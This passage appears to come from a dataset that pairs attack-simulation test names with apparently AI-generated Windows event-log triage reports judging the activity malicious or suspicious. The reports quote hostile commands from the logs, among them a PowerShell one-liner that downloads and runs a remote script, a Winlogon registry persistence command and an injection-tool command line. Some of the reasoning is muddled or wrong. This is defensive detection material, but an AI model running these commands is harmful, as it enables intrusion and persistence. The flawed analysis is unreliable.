- **Security Review:** Review the affected system's security patches and updates, especially concerning PowerShell execution policies and unauthorized modifications to the system configuration.
- **User Review:** Investigate the activities and potential compromise of the user account `SERVER002\admin_test` associated with the execution of these suspicious activities.

Given the clarity of the evidence regarding the potential compromise, maintaining heightened alertness to further suspicious activities across the network is essential."
Suspicious vbs file run from startup Folder,"Based on the event log analysis provided, here are the findings:

1. **Unusual PowerShell Execution**:
   - There are multiple PowerShell events with the command line executing commands to copy a `.vbs` file (`vbsstartup.vbs`) to startup directories and subsequently executing it with `cscript.exe`. 
   - These are noticeable because writing scripts to the startup folder and executing `VBScript` files directly are often associated with persistence mechanisms in malware activity. This is because they ensure that the script runs every time the user logs in, potentially indicating an attempt to maintain persistence.

2. **Sysmon Logs Review**:
   - There are repeated executions of `wevtutil.exe` and `conhost.exe`, along with a script execution using `cscript.exe`.
   - `wevtutil.exe` is often used to query or modify event logs and can be suspicious if used outside normal maintenance activities. Although there is no direct indication it was used maliciously, the repeated execution alongside script activities might be related to clearing logs or other evasive operations.
   - The invocation of `cscript.exe` to execute `vbsstartup.vbs` further aligns with suspicious behavior in PowerShell events.

3. **Security and System Logs**:
   - No explicit anomalous user account behavior is highlighted, though time adjustments noted could potentially indicate tampering to confuse time-based analysis of events.

**Assessment**:
- The entire sequence of copying and executing a `.vbs` file in the startup folder via PowerShell, and subsequently executing using `cscript.exe`, combined with the possibly related Sysmon logs, shows behavior consistent with:
  - **Persistence**: By placing the script in the startup folder.
  - **Execution**: Running a script that might perform unwanted actions at startup.
  
**Conclusion**:
- **Resolution: MALICIOUS**

The logs contain activity most likely indicating the use of PowerShell to achieve persistence through unauthorized script execution. Immediate response actions should include:
- Isolating Server002 from the network to prevent further possible compromise.
- Analyzing and removing the suspicious `.vbs` script from startup directories.
- Conducting a full security assessment on Server002 for further undisclosed compromises.
- Implementing enhanced monitoring for PowerShell and script activities across the network."
PowerShell Modify A Scheduled Task,"Upon reviewing the provided event logs from the Windows host, I've identified several entries of interest that could potentially indicate malicious activity. Here's the detailed analysis:

### Windows PowerShell Logs
- **Scheduled Task Creation via PowerShell**: 
  - The event logs show multiple instances where PowerShell was used to perform some significant operations. 
  - A PowerShell script is creating a scheduled task using `New-ScheduledTaskAction` with `cmd.exe` and later modifying it to execute `Notepad.exe`. 
  - The scheduled task is executed at login with the highest run level under the administrative group (`BUILTIN\\Administrators`). 
  - This is suspicious because creating and manipulating scheduled tasks, especially with administrative rights, is a common tactic used by attackers to maintain persistence on a system.

### Sysmon Logs
- **Execution of `wevtutil.exe` and `conhost.exe`**: 
  - Entries show `wevtutil.exe` and `conhost.exe` being executed by `SERVER002\admin_test`. Usage of `wevtutil.exe` is common for attackers to manipulate event logs, potentially to clear them.
  
- **Execution of `hostname.exe`, `whoami.exe`, `PowerShell.exe`**:
  - `hostname.exe` and `whoami.exe` are basic utilities but their execution could signify enumeration or reconnaissance activities by an attacker.
  - Importantly, `PowerShell.exe` execution with a suspicious command line that correlates with the PowerShell logs indicating scheduled task manipulation. 

### System and Security Logs
- **Time Manipulation Event**:
  - The logs depict a change in system time. Time stomping is a method whereby an attacker changes the timestamps to cover tracks. It could be used to align malicious activities with allowed time windows or potentially disrupt system monitoring and logging.

- **Privilege Escalation**:
  - Multiple logins by `admin_test` with a list of high privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege` etc.). 
  - These privileges allow changes to various security aspects of the host and manipulation of system processes which could be used for malicious intent.

### Assessment and Recommendation
Upon analyzing the evidence, the actions described meet several indicators of compromise commonly seen in cyber attacks:
- Creation of scheduled tasks with administrative privileges via PowerShell.
- Execution of system binary `wevtutil.exe` to potentially manipulate event logs.
- Time manipulation which can obscure logging activities.
- Elevated privileges attributed to `admin_test` user account.

### Conclusion
Based on the above findings, it appears there is strong evidence of malicious activity occurring on this Windows host, characterized by persistence mechanisms, potential log evasion, and reconnaissance activities.

**Resolution**: **MALICIOUS**

**Guidance**:
1. Immediately investigate the legitimacy of the `admin_test` account.
2. Review and remove any unauthorized scheduled tasks.
3. Conduct a thorough review of security logs for any further unauthorized access attempts.
4. Consider isolating the affected system to prevent further spread or damage.
5. Perform a full security audit and consider deploying forensic tools to assess and capture evidence of potential compromise."
Suspicious jse file run from startup Folder,"Upon reviewing the provided logs, there are several points of concern that suggest potential malicious activity:

### Security and System Logs:
1. **EventID 4616**: The logs show changes in system time being logged by `svchost.exe`, which itself is a legitimate Windows process but can be exploited for malicious purposes. This may indicate potential time tampering, often used to mislead analysis or logs.

### PowerShell Logs:
1. **Script Execution**: The PowerShell logs reveal the execution of a script (`jsestartup.jse`) via `cscript.exe`, a script host for executing JScript files. The use of JScript files and their placement in a startup directory is a significant indicator of potential persistence mechanisms by malware. Additionally, the PowerShell command executed copies this script into startup folders, another red flag indicating an attempt to maintain persistence across system reboots.

### Sysmon Logs:
1. **Frequent Usage of `wevtutil.exe` and `conhost.exe`**: These tools are often used for interacting with and managing Windows Event Logs and console windows, respectively. However, the frequent and simultaneous activation of these processes may indicate evasion of event logging. `wevtutil.exe` is known to be used to clear logs.
2. **Malicious Powershell Script**: The detailed Sysmon logs substantiate the PowerShell execution of the script that was indicated in the PowerShell logs.
3. **Process Spawning and Event Combinations**: There is the creation and execution of `cscript.exe` with the same JScript file seen in PowerShell logs, driven by `powershell.exe`. This automated behavior usually aligns with malware patterns.

### Application Logs:
1. **EdgeUpdate Activity**: Although frequent updates by `MicrosoftEdgeUpdate.exe` are normal to an extent, the logs reflect rapid, multiple instances of Microsoft Edge Update processes. This could merely be benign update checks, but in conjunction with other red flags, warrants scrutiny to rule out potential misuse or an anomalous/upcoming threat.

### Conclusion:
There are credible indications of malicious activity based on the persistence mechanisms and potential log file manipulation. The PowerShell script placement and execution strategy, combined with the frequency and nature of event logs related to system and process manipulation, strongly point to potential compromise or threat activity.

### Resolution:
- **MALICIOUS**: The evidence within these logs, particularly the adequately documented persistence mechanism through the JScript file and the manipulative execution of system utilities, suggests a high likelihood of malicious activities.

### Recommendations:
1. **Immediate Investigation**: Suspend and investigate potentially affected systems, especially focusing on the PowerShell script, its contents, and origin.
2. **Containment**: Isolate the affected machine to prevent potential spread.
3. **Log Monitoring**: Heighten log monitoring across similar systems looking for similar patterns.
4. **Update Scans**: Ensure security solutions are updated to detect potential threats related to JScript and PowerShell abuse.
5. **Audit and Remediation**: Conduct a thorough audit for additional anomalies and remediate based on findings."
Winlogon Shell Key Persistence - PowerShell,"Based on the provided event logs, here's a detailed analysis:

1. **PowerShell Activity:**
   - The logs reveal a PowerShell activity where a command is executed to set a registry item for the shell to include both `explorer.exe` and `cmd.exe`. This command is executed with the `-Force` flag, which is used to overwrite or change existing configurations without prompt.
   - The PowerShell command:
     ```
     Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force
     ```
   - Modifying registry entries related to the system's shell behavior, especially to include another executable like `cmd.exe`, is an indicator of potential compromise. This activity could potentially be used by an attacker to execute additional scripts or commands upon user login.

2. **Sysmon Logs and Process Creation Events:**
   - Multiple instances of legitimate system binaries such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` being executed with a user account `SERVER002\admin_test`.
   - The parent processes for some command executions are `wsmprovhost.exe`, which is a legitimate Windows Management Instrumentation (WMI) host process.
   - The execution of `powershell.exe` with a potentially malicious command hints at attempts to persist or escalate privileges.

3. **Event Logs Analysis:**
   - There doesn't seem to be any obvious privilege escalation attempts or unusual command-line arguments beyond the suspicious PowerShell activity.
   - Time-related events and standard Windows service processes like `sppsvc.exe`, `MicrosoftEdgeUpdate.exe`, `TrustedInstaller.exe`, and `TiWorker.exe` are routine system operations and do not indicate suspicious activity by themselves.

4. **Potential Indicators of Malicious Activity:**
   - The manipulation of registry settings to change shell behavior to launch `cmd.exe` along with `explorer.exe` is consistent with tactics seen in certain types of malware or intrusions aimed at gaining persistent command-line access.

**Risk Assessment and Guidance:**
- **Threat/Risk Identified:** There is an indicator of malicious activity with the PowerShell command used to alter the system's shell behavior. This could potentially allow unauthorized execution of commands upon a user's login.
  
- **Recommended Actions:**
  - Perform a thorough investigation on the system to check for other signs of compromise, including scanning for malware or unauthorized software.
  - Review the actions and history of the user account `SERVER002\admin_test` for any suspicious activities.
  - Revert the changes made to the registry entry and ensure no unauthorized scripts or applications persist on startup.
  - Enhance monitoring and alerting for similar PowerShell command execution in real time.
  - Educate users on safe handling of scripts and enhance policy controls to limit execution of unauthorized PowerShell commands.

**Resolution:** **MALICIOUS** - The logs contain activity that is suspicious enough, particularly with unauthorized registry changes via PowerShell, indicating a high risk of malicious activity. Further investigation and actions to mitigate potential threats are needed."
LockBit Black - Modify Group policy settings -cmd,"Upon reviewing the provided log entries, a few points of interest and potential concerns arise:

1. **Time Synchronization Events**: The System and Security logs indicate several time synchronization events around `19:01:30`. These actions involve svchost.exe, which is a legitimate Windows process, often used to host multiple Windows services. The time changes and synchronization events themselves appear normal and consistent with routine Windows operations, adjusting the system time with a network time service.

2. **Use of Wevtutil.exe**: There are multiple references in the Sysmon logs to the execution of `wevtutil.exe`. Wevtutil is a command-line utility for managing and querying event logs. Its execution by the user `SERVER002\admin_test` appears routine unless paired with specific suspicious commands, which are not visible in the provided logs. 

3. **Command Line Arithmetic with CMD**: The Sysmon logs include a command line execution using `cmd.exe` with a series of registry modifications using `reg.exe`. These registry entries relate to Group Policy Refresh Times and SmartScreen settings:
   - Disabling SmartScreen and manipulating Group Policy refresh settings could be an attempt to weaken security measures on the system.
   - The command is executed under a user with administrative privileges (likely `admin_test`), indicating this user has sufficient permissions to enforce such configurations.

4. **Microsoft Edge Update Sequence**: The logs show extensive activity related to the update processes of Microsoft Edge (`MicrosoftEdgeUpdate.exe`). These activities include multiple subprocesses and operations not uncommon during automatic updates. These processes are executed by `NT AUTHORITY\SYSTEM`, which could be indicative of regular automated software updates rather than anything nefarious. However, repeated executions in quick succession could suggest abnormal or failed update cycles.

5. **Integrity Level and Exec Control**: Integrity levels are marked as ""High"" for user `SERVER002\admin_test`, indicating control over changes, especially those registry modifications. 

### Assessment:
- There are signs of potentially risky behavior with the command line executions modifying the registry, particularly those that disable security features, which require attention.
- The frequency and nature of registry modifications, particularly disabling SmartScreen and zeroing policy refresh times, are actions typically seen in configurations aiming to weaken system defenses.
  
### Recommendation:
Further investigation is warranted, focusing on:
- User `admin_test` activities: Verify the legitimacy of the commands executed and governance over registry modifications.
- Check recent system changes for unauthorized access if any malware or malicious software was executed.
- Validate if Edge update activities were completed successfully and are consistent with expected behavior.

### Resolution:
Based on the evidence found and the nature of registry changes, the activity is marked as **SUSPICIOUS**. Further investigation is necessary to validate intent and scope, ensuring no malicious actions are taken or continued under administrative credentials."
Domain Password Policy Check: Short Password,"Upon reviewing the provided logs, I've identified several areas of interest that suggest suspicious activity, possibly indicating a security compromise. Let's break down the anomalies and potential indicators of compromise:

### PowerShell Logs Review:

1. **Repeated PowerShell Script Execution**:
   - The PowerShell logs indicate attempts to change passwords using a script involving `Set-ADAccountPassword`. The script checks if a credential file exists, verifies the password, and attempts to set a new one (""Uplow-1"").
   - This behavior might be legitimate in a controlled environment where automated password management is implemented. However, storing credentials in plain text on disk (`$credFile`) and using them for authentication without proper encryption practices strongly suggest inappropriate security practices, possibly leading to credential compromise.

2. **Registry and Credential File Usage**:
   - The script references a user-specific `.txt` file in the `LOCALAPPDATA` directory, which could potentially expose sensitive information if accessed by unauthorized processes or users.

### Sysmon Logs Review:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
   - Multiple instances of `wevtutil.exe` (used for managing Windows event logs) and `conhost.exe` (Console Window Host) executed repeatedly within a short timeframe under the `SERVER002\\admin_test` account.
   - Such frequent execution, especially `wevtutil.exe`, could indicate attempts to query or clear event logs to hide activities, which is a technique often used by attackers post-compromise.

2. **Execution of `hostname.exe` and `whoami.exe`**:
   - Execution of common administrative commands such as `hostname.exe` and `whoami.exe` can be seen. While these two are benign operations individually, they can be used by attackers to enumerate system details and user contexts.

3. **High Integrity Level**:
   - The PowerShell process is running at a high integrity level, suggesting it could potentially attempt privilege escalation or modify system-level operations.

### Assessment:
Considering the repetitive and automated nature of password manipulation activities, combined with the use of scripts that could expose credentials, there is a high chance of misuse or malicious intent. Additionally, the frequent invocation of `wevtutil.exe` alongside `conhost.exe` under an administrative account suggests potential stealth techniques to clear logs and remain undetected.

### Resolution:

**SUSPICIOUS** - The observed behavior does not conclusively prove a security breach, but it does raise significant concern due to unsanctioned credential management and event log manipulation activities. Further investigation is necessary to validate the intent behind these scripts and executions. Specifically, access to the credential file and script context should be audited, and users involved should be queried for clarity on these activities.

### Guidance:
- **Immediate Actions**: 
  - Confirm the legitimacy of the PowerShell scripts with the respective system/network administrators.
  - Check the integrity of the credential file and ensure it has not been tampered with.
  - Verify that the use of `wevtutil.exe` aligns with any documented administrative activities, otherwise investigate potential misuse.

- **Long-term Actions**: 
  - Enhance monitoring and logging to capture detailed activities around critical Windows subsystems and PowerShell executions.
  - Implement strict access controls and audit trails for credential management scripts and execution, ensuring adherence to best security practices like encryption and minimal access.

Moving forward, a thorough investigation should be carried out to address these suspicious behaviors, ensuring any potential security risks are mitigated effectively."
Allowing custom application to execute during new RDP logon session,"Upon reviewing the provided Windows event logs, several points of interest can be highlighted:

1. **Privilege Escalation Indicators**: There are multiple `4672` events, which indicate special privilege assignments to a user account. This is generally an area of concern as it could imply privilege escalation. The frequent occurrence of `SeDebugPrivilege` and other powerful rights being logged especially for `admin_test` and the `SYSTEM` account is noteworthy. This should be investigated further to ensure that these privileges were legitimately acquired and not the result of a malicious escalation attempt.

2. **Suspicious Process Creation**:
   - The `Sysmon` logs show the execution of a `cmd.exe` process with a command line that includes a registry modification (`reg add`) to start an unauthorized process (`calc`). This could potentially be an attempt to achieve persistence or privilege escalation, which is characteristic of malicious activity.
   - Powershell commands are logged with restricted execution policies. The pattern of commands suggests that scripts may have been executed to enumerate or modify system settings. Given that PowerShell is a common tool used in attacks, these entries deserve further investigation, primarily around their origin and intent.

3. **Edge Update Activity**: There are multiple logs related to `MicrosoftEdgeUpdate.exe` activities, including events suggesting installation or updating processes. While these may be part of legitimate system update mechanisms, the log entries should be cross-referenced with known update schedules or approvals to ensure they match expected behavior.

4. **Use of Microsoft Compatibility Telemetry (`CompatTelRunner.exe`)**: The frequent execution of `CompatTelRunner.exe` might be benign as it is associated with Microsoft's data collection for telemetry purposes. However, if not expected in such frequency, it should be assessed for any tampering or misuse.

5. **Potential Unauthorized Access or Enumeration**: The `Event ID 4798` logs indicate enumeration or queries related to specific users and security groups. While this could be legitimate administrative activity, it may also signal a reconnaissance effort by malicious actors.

Given these observations, the activity in the logs is classified as **SUSPICIOUS**:

- The use of privileged commands and registry modifications, especially those that could establish persistence, merits further investigation.
- Understanding the context and source of PowerShell commands and cmd.exe executions is crucial to determining legitimacy.
- Cross-referencing Edge update activities and telemetry data collection against expected policies or user activities can clarify if these are benign or need attention.

### Recommendations:
- Conduct a thorough audit of user accounts and privileges, focus particularly on `admin_test` and SYSTEM-related activities during this timeframe.
- Review logs for related network traffic or concurrent anomalies that would support or refute the possibility of an external compromise.
- Investigate the registry changes, verify with IT change logs or team if these changes were authorized.
- Consider deploying enhanced monitoring on the host, especially for command and script execution, to catch potential ongoing or future threats.

Further analysis and potentially forensic investigation could yield a better understanding of whether these activities constitute an actual compromise."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"Upon examining the Windows event logs, several observations can be made:

### System and Security Logs:
The logs contain numerous timestamp correction events which suggest that time synchronization occurred on the host machine. These activities appear to be standard operating system processes carried out by `svchost.exe` managing time synchronization tasks, indicated by the Microsoft-Windows-Kernel-General and Microsoft-Windows-Security-Auditing providers. There are no unusual entries or indications of malicious behavior in these logs.

### Application Log:
The presence of Windows Defender being active (SECURITY_PRODUCT_STATE_ON) is noted, with no immediate evidence of threats. The indication of Software Protection Platform Service suggests the regular operation of Microsoft's licensing service without any entries suggestive of malicious activities.

### PowerShell Logs:
The PowerShell logs contain concerning entries. Multiple events recorded with command lines involve the execution of a script directly from a URL:
```
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}
```
This command utilizes PowerShell's ability to download and execute scripts directly from the internet, which is a known technique often used by attackers for remote code execution. The usage of `Invoke-Expression` (iex) is particularly risky as it allows downloaded content to be executed, which is a red flag for malicious activity.

### Sysmon Logs:
The Sysmon logs show processes indicative of typical system administration tasks such as the execution of `hostname.exe` and `whoami.exe`. However, there is nothing in the Sysmon logs that immediately indicates malicious behavior beyond the execution of PowerShell with external scripts as noted above.

### Conclusion and Assessment:
The significant concern stems from the PowerShell usage where scripts are downloaded and executed directly from a URL. This behavior is often associated with malware distribution and invoking remote scripts for unauthorized system alterations or data exfiltration.

### Resolution: MALICIOUS

### Recommendations:
1. **Immediate Quarantine:** Isolate and investigate the affected host to prevent further network compromise.
2. **Block and Review Network Activity:** Implement network-level blocks on the flagged URL and check network logs for any communication with this or other suspicious domains.
3. **Conduct System Scan:** Run comprehensive malware and rootkit scans using updated security tools.
4. **Audit and Harden Security:** Review and enforce security measures around script execution policies, such as setting a stricter PowerShell execution policy and disabling script execution from web sources where possible.
5. **Incident Response:** Follow internal incident response protocols to analyze potential data breaches or compromises resulting from the identified malicious activity.
6. **User Awareness Training:** Educate users on the risks of executing unknown scripts and enhance awareness around suspicious activities."
HKLM - Add atomic_test key to launch executable as part of user setup,"After reviewing the provided logs, there are several key observations and potential indicators of malicious activity:

1. **PowerShell Logs:**
   - The PowerShell logs show that a script was executed that modifies registry keys under `HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components`. It creates a key named ""file_test"" with a default value ""ART TEST"" and sets a ""StubPath"" that points to `C:\Windows\System32\calc.exe`. Finally, it calls `runonce.exe` with the `/AlternateShellStartup` parameter.
   - Modifying the registry to execute specific programs during system startup can be an indication of persistence techniques used by malware. However, it's worth noting that `calc.exe` is a legitimate application, which is commonly used as a benign test. Still, this could be part of a tactic to hide malicious intent behind a benign application.

2. **Sysmon Logs:**
   - The Sysmon logs show a series of process creations and communications involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `powershell.exe`, `runonce.exe`, and `calc.exe`.
   - The execution of `wevtutil.exe`, particularly by a user named ""admin_test"", could be legitimate but can also be used to clear event logs by attackers trying to cover their tracks.
   - `runonce.exe` running ""C:\Windows\System32\calc.exe"" indicates the successful setting of the stub path and its execution. This aligns with the behavior recorded in PowerShell logs and reaffirms suspicion.
   - The sequence of events suggests privileged activity by the user ""SERVER002\\admin_test"". 

3. **Security Logs:**
   - There are logs related to time change events by the `LOCAL SERVICE` which might not be immediately suspicious but are often indicative of past unauthorized time changes for concealing activities or synchronizing with other timestamps externally sourced.

4. **System and Application Logs:**
   - The system logs reflect regular operations such as time synchronization and timezone updates by `svchost.exe`. Application logs indicate the stopping of services apparently related to Edge updates, with no immediate suspicious entries.

**Assessment:**
The activity involving PowerShell registry modifications, execution of system binaries like `runonce.exe` through registry modifications, and the use of sysinternals tools (like Sysmon capturing these events) represent techniques used in persistent malware or during post-exploitation phases. Given these suspicious patterns and the potential for persistence mechanism through registry modification, I would classify this activity as:

- **SUSPICIOUS** - The activity needs more in-depth investigation to confirm if it indeed poses a genuine threat or was conducted by an internal actor for testing or legitimate administrative purposes.

**Guidance:**
1. **Further Investigation:**
   - Verify the legitimacy of the user who executed the scripts, especially ""admin_test"".
   - Examine any other unusual patterns related to the process executions and file modifications.
   - Investigate the context of registry changes—determine whether they were made by a legitimate software installation or manually by an actor.
   
2. **Monitoring and Detection:**
   - Implement enhanced monitoring of registry changes to detect further attempts at persistence.
   - Configure alerts for unusual PowerShell execution patterns, particularly those modifying system states.

3. **Containment and Remediation:**
   - If subsequent investigation confirms malicious activity, isolate affected systems and remove the persistence mechanisms from the registry.
   - Conduct a detailed forensic examination of the system and involved user accounts.

4. **User Education and Policy Enforcement:**
   - Ensure that system administrators and users understand the impact and signs of suspicious activity.
   - Review and tighten policies around the use of administrative tools and scripts execution."
Read-Write-Execute process Injection,"Upon analyzing the provided Windows event logs, there are several key observations that indicate potentially suspicious and possibly malicious activities:

1. **PowerShell Activity**:
   - Repeated instances of `powershell.exe` being called with complex command-line arguments are evident, particularly with scripts that appear to access and manipulate DLLs (`vuln_dll`) and run potentially unauthorized executables (`searchVuln.exe`, `RWXinjectionLocal.exe`).
   - The presence of potential DLL injection or memory manipulation techniques raises significant concerns, especially when executed from a temporary directory.

2. **Execution from Temporary Directories**:
   - The execution of PowerShell commands from the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory is abnormal and may indicate temporary, malicious script execution often associated with malware or exploit activity.

3. **Use of Utilities**:
   - The logs show the execution of `wevtutil.exe`, `hostname.exe`, and `whoami.exe`. While these applications are legitimate Windows utilities, their concurrent and repeated execution alongside abnormal PowerShell activities might suggest an attempt to gather system information or modify event logs to cover tracks.

4. **Timing and Process Pattern**:
   - All observed activities happen in quick succession, which can be indicative of automated scripts or malware rather than standard user actions.

5. **Privilege Level and Integrity**:
   - The activity is executed with a high integrity level using an administrative account (SERVER002\admin_test), suggesting a potential privilege escalation. This could indicate compromised credentials or misuse of an admin account.

**Assessment**:
- The combination of high-integrity PowerShell execution with non-standard command-line operations, particularly involving DLLs in a temporary directory, is a known pattern of malicious activity aimed at exploiting Windows systems.
- Tools being executed possibly to facilitate or obfuscate further malicious activity also raise suspicion.

**Resolution:**
- **MALICIOUS**: The logs strongly suggest malicious behavior, including potential exploitation or unauthorized activity. Immediate action should be taken to isolate the system to prevent further propagation or damage.

**Guidance**:
1. **Isolate the affected system**: Limit network access to prevent potential lateral movement or data exfiltration.
2. **Perform Detailed Forensic Analysis**: Examine any files or scripts in the suspect directories for malware or scripts.
3. **Review Access Logs and Credentials**: Determine if any unauthorized access has occurred and if credentials have been compromised.
4. **Update Security Measures**: Ensure systems are updated with the latest security patches and review endpoint protection configurations.
5. **Notify Incident Response Teams**: Engage appropriate incident response protocols to mitigate, investigate, and remediate potential wider threats within the network."
Scheduled task Remote,"After examining the provided logs from the Windows host, here is the analysis based on the logs:

1. **Application Log:**
   - A log entry from the Software Protection Platform Service was identified. This generally pertains to licensing and activation tasks. No suspicious activity was noted in this log.

2. **System Log:**
   - Multiple entries show adjustments to the system time by `svchost.exe`. Time changes can sometimes indicate malicious activity like log manipulation or attempting to bypass time-based security measures. However, the change noted here seems consistent with legitimate service activity, specifically in the context of time synchronization using a trusted source (`time.windows.com`).

3. **Security Log:**
   - Multiple time change entries from `svchost.exe` with `LOCAL SERVICE` and `NT AUTHORITY`. These align with time synchronization activities and while worth noting, do not initially flag any malicious behavior.

4. **Sysmon Log:**
   - Several processes of interest are observed:
     - `wevtutil.exe` appears multiple times, which can be legitimate in administrative contexts.
     - `cmd.exe` is executed with a command to create a scheduled task using `SCHTASKS`. The task is being created with specific user privileges (notably `DOMAIN\user` and credentials indicating `At0micStrong`). Creation of scheduled tasks is often used in persistent execution tactic by attackers.
     - Subsequent entries involve execution of `schtasks.exe`, reflecting the task creation.
     - Regular entries related to `MicrosoftEdgeUpdate.exe`, `TiWorker.exe`, and `TrustedInstaller.exe`, which are common Windows processes, especially related to updates and system services.

5. **Key Indicators:**
   - The execution of `cmd.exe` to create a scheduled task is sensitive and could indicate potential malicious behavior or misuse of administrative capabilities. The use of hard-coded credentials is particularly suspicious.
   - If the credentials or scheduled tasks are unexpected by the administration, this sets off further investigation alarms.

**Assessment:**
- While general system and application log activities appear consistent with standard operations, the creation of a scheduled task via `cmd.exe` stands out as a potentially risky operation.
- The combination of process behavior, especially if `At0micStrong` is not a recognized strong credential or operational password, raises suspicions.

**Resolution:**
- **SUSPICIOUS**: The activity involving scheduled task creation by `cmd.exe` could indicate an attempt at persistence by an adversary if unintended. More investigation is needed, focusing on:
  - Verifying the legitimacy of the triggered schedule tasks.
  - Ensuring that `At0micStrong` and related credentials are intended and known within the organization.
  - Cross-referencing against user and endpoint baselines. 

Immediate steps should include alerting the respective IT security and operations teams to verify the scheduled tasks' legitimacy, check for any unauthorized changes, and ensure system integrity."
Section View Injection,"Based on the analysis of the provided Windows event logs, there are several indicators that warrant further scrutiny and potential classification as suspicious or possibly even malicious activity. Let's break down the analysis:

1. **System Clock Manipulation**:
   - The Security log entries (EventID: 4616) indicate a system time change where the ""NewTime"" is earlier than the ""PreviousTime"". This behavior can be associated with attempts to manipulate system logs or hide activities by altering the system's time.

2. **Privileged User Activity with High-Value Privileges**:
   - The Security log shows a user (`admin_test`) gaining an elevated set of privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) (EventID: 4672). While this might be normal admin activity, it can also indicate preparations for malicious activities such as debugging or injecting into system processes.

3. **Suspicious PowerShell Command**:
   - The PowerShell logs indicate that a PowerShell script was executed with a command to start multiple processes, including `notepad.exe` and a suspicious executable - `InjectView.exe`. The presence of a potentially suspicious or unknown executable typically resides in `Tmp` directories, which is often used by attackers to deploy malicious code.

4. **Unusual Process Execution**:
   - Sysmon logs show `wevtutil.exe`, `conhost.exe`, and `whoami.exe` being run by the user `admin_test`. While these processes can be legitimate, frequent execution of these utilities, particularly in a short timeframe, can be indicative of reconnaissance or privilege escalation attempts.

5. **Network-related Service Execution**:
   - `sppsvc.exe` (Software Protection Platform Service) and other system processes are being executed. This can reflect normal system operations, but its presence in conjunction with other suspicious activities requires attention.

### Assessment and Suggested Actions:

- **Classification:** The logs are classified as **SUSPICIOUS** due to the combination of system time manipulation, usage of high-privilege accounts, and execution of a potentially malicious PowerShell command.
  
- **Suggested Action:**
  - **Investigate**: Conduct a deeper investigation into the user account `admin_test`, especially focusing on recent activities and changes within this environment.
  - **Forensic Analysis**: Perform detailed forensic analysis of the machine to verify if `InjectView.exe` is legitimate or a malicious payload.
  - **Network Traffic Analysis**: Inspect the network traffic from the IP `192.168.1.168` (logged under the Security log EventID: 4624) for unusual patterns or connections.
  - **System Restore**: If confirmed malicious, consider restoring the system to a point before the suspicious activity was detected.

By following these steps, a precise understanding of the potential threat can be obtained, and necessary actions can be executed to secure the infrastructure. Further analysis might change the log classification based on additional evidence."
EarlyBird APC Queue Injection in Go,"In analyzing the provided event logs, a few elements stand out, particularly regarding potential suspicious activity that warrants further investigation. Here's a breakdown of these elements:

1. **Unusual Time Change Events**:
    - The system logs record two instances of time change events (`EventID`: 24) initiated by `svchost.exe`. The logs show discrepancies in time, with the ""NewTime"" being set back to previous values. These changes happen quite frequently and could indicate attempts to obfuscate activities or log events by manipulating the system time.

2. **Command Execution Patterns**:
    - The execution of `powershell.exe` with a command line that includes `EarlyBird.exe` is notable. This tool is often associated with advanced penetration testing and can be used for process injection and other stealthy operations. The command included in the PowerShell log:
      ```
      Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      CommandLine: ""powershell.exe"" & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\x64\EarlyBird.exe -program \""""C:\Windows\System32\werfault.exe\"""" -debug}
      ```
      Executing such a nonstandard command via PowerShell could potentially indicate malicious testing or execution of unauthorized code, especially given the use of `werfault.exe`, a standard Windows error reporting process, potentially as a cover.

3. **Privileged Logons and Process Executions**:
    - The execution logs show multiple processes (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`) being executed by the user `SERVER002\admin_test`. While the use of administrative tools and utilities like `wevtutil.exe` and `whoami.exe` can be legitimate, their recurrent execution along with PowerShell could indicate lateral movement or reconnaissance on the network.

4. **High Integrity Level for Processes**:
    - Multiple processes are run with high integrity level, including the PowerShell execution. This typically occurs in privileged execution contexts and should be scrutinized when such processes execute potentially suspicious operations.

5. **Privilege Escalation Indicators**:
    - Security logs indicate that the user `admin_test` was granted elevated privileges on multiple occasions. The presence of privileges such as `SeDebugPrivilege` and `SeImpersonatePrivilege` is explicitly indicative of potential privilege escalation attempts.

Given the combination of these activities, the timestamp modifications, unusual PowerShell command executions, especially with tools that might be used for malicious activity, repeated high-integrity process executions, and the granting of elevated privileges, the log entries exhibit signs of suspicious behavior that could be malicious or indicative of a security testing scenario.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Investigate Time Changes**: Confirm whether these time changes were authorized or if they correlate with known maintenance activities or unauthorized actions.
- **Monitor and Audit the Account**: Investigate the actions taken by `SERVER002\admin_test` and confirm if these were authorized actions.
- **Analyze `EarlyBird.exe`**: Conduct a detailed review of this binary and any associated files in the specified file path to check for unauthorized modifications or indications of a threat actor presence.
- **Review Privilege Assignments**: Ensure that privilege assignments are consistent with role-based access control (RBAC) policies and audit any deviations.
- **Notify Security Teams**: Alert relevant security teams to increase monitoring and potentially isolate affected systems if further malicious activity is confirmed."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"Upon reviewing the provided Windows event logs, several observations and potential indicators of suspicious activities are identified:

1. **Unusual PowerShell Activity**:
   - Several PowerShell events initiated around the same timestamp (2024-10-27 16:47:54). Notably, a script is modifying registry keys related to 'Security Packages' in the LSA registry, changing them to include a DLL named ""AtomicTest.dll"". This type of activity can be indicative of a malicious intent to load unauthorized security packages, possibly for credential dumping or other nefarious actions.
   - The modification involves registry keys under `HKLM:\System\CurrentControlSet\Control\Lsa` which are critical for security operations. Such modifications could allow unauthorized code to interact with the security subsystem.

2. **Event Log Clearing**:
   - There are multiple events indicating that the System and Security event logs were cleared by a user named `admin_test` (Event IDs 104 in System log and 1102 in Security log). This is almost always a suspicious behavior, as attackers often clear logs to hinder forensic analysis of their activities.

